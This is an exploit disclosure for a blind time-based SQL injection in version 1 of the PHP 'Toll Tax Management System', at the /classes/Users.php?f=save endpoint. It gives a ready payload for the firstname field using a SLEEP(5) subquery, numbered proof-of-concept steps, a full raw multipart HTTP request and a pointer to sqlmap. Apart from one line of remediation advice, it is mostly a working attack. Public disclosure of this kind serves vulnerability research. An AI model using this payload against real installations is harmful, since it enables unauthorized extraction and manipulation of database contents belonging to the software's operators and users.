
# Exploit Title: 
SQLI Blind (Toll Tax Management System)
# Date: 
22/09/2023
# Exploit Author: 

Xcode0x (Mohamed Almarri)

Twitter: @xcode0x

# Vendor Homepage: 
[https://github.com/oretnom23]()
# Software Link: 
https://www.sourcecodester.com/php/15304/toll-tax-management-system-phpoop-free-source-code.html
# Version: 
v1
# Tested on: 
debian

----
# SQLI BLIND   :

The application's endpoint /classes/Users.php?f=save is vulnerable to blind SQL injection. By injecting a payload into the firstname field, specifically Adminstrator' AND (SELECT 2171 FROM (SELECT(SLEEP(5)))hgdO)-- EnP, an attacker can introduce a conditional delay in the SQL query. If the server responds with a delay of approximately 5 seconds after processing this request, it confirms the vulnerability. This vulnerability can allow attackers to infer information about the database and potentially extract data or perform administrative operations. It's recommended to sanitize all user inputs and use prepared statements to prevent such attacks.
# POC [debian]:

1- login as admin and go to profile [http://10.0.30.0:1337/admin/?page=user] .

2- set you payload in firstname or use sqlmap .

POST /classes/Users.php?f=save HTTP/1.1

Host: 10.0.30.0:1337

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

X-Requested-With: XMLHttpRequest

Content-Type: multipart/form-data; boundary=---------------------------87171060839686939451677610311

Content-Length: 999

Origin: http://10.0.30.0:1337

Connection: close

Referer: http://10.0.30.0:1337/admin/?page=user

Cookie: PHPSESSID=o23q98hs6j8ut4u548ebt8epe4



-----------------------------87171060839686939451677610311

Content-Disposition: form-data; name="id"


1

-----------------------------87171060839686939451677610311

Content-Disposition: form-data; name="firstname"


Adminstrator' AND (SELECT 2171 FROM (SELECT(SLEEP(5)))hgdO)-- EnP

-----------------------------87171060839686939451677610311

Content-Disposition: form-data; name="middlename"


s

-----------------------------87171060839686939451677610311

Content-Disposition: form-data; name="lastname"


Admin

-----------------------------87171060839686939451677610311

Content-Disposition: form-data; name="username"


admin

-----------------------------87171060839686939451677610311

Content-Disposition: form-data; name="password"


-----------------------------87171060839686939451677610311

Content-Disposition: form-data; name="img"; filename=""

Content-Type: application/octet-stream


-----------------------------87171060839686939451677610311--


![Drag Racing](https://github.com/xcodeOn1/SQLI-TollTax/blob/main/h.png)

![Drag Racing](https://github.com/xcodeOn1/SQLI-TollTax/blob/main/s2.png)

 # Tested  

 Linux - debian
